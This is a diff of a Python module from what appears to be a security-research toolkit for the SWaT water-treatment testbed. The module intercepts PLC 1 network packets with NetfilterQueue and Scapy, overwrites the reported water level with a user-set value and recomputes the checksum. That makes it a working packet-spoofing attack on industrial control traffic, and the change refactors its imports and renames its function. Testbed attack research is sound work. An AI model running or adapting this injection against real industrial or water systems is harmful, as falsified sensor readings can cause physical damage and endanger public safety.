@@ -22,7 +22,7 @@
 """Secure Water Testbed (SWaT) Singapore University of Technology and Design.
 SWATAttack module to inject a constant bias to the water level in PLC 1.
 """
-from __future__ import print_function
+from __future__ import print_function, division
 
 import os
 from netfilterqueue import NetfilterQueue
@@ -30,18 +30,18 @@ from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 
-import scaling
-import swat
+from swat.plc1 import SWAT_P1_RIO_AI
+from swat.scaling import signal_to_current, P1Level
 
 # Parameters list
 level = 0
 slevel = 0
 
 
-def __spoof(packet):
+def __inject(packet):
     pkt = IP(packet.get_payload())
-    if swat.SWAT_P1_RIO_AI in pkt:
-        pkt[swat.SWAT_P1_RIO_AI].level = level
+    if SWAT_P1_RIO_AI in pkt:
+        pkt[SWAT_P1_RIO_AI].level = level
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
 
@@ -51,7 +51,7 @@ def __spoof(packet):
 def start():
     __setup()
     nfqueue = NetfilterQueue()
-    nfqueue.bind(0, __spoof)
+    nfqueue.bind(0, __inject)
     try:
         print("[*] starting water level spoofing")
         nfqueue.run()
@@ -64,7 +64,7 @@ def start():
 def configure():
     global slevel, level
     slevel = input('Set level (mm): ')
-    level = scaling.signal_to_current(slevel, scaling.P1Level)
+    level = signal_to_current(slevel, P1Level)
     params()
 
 
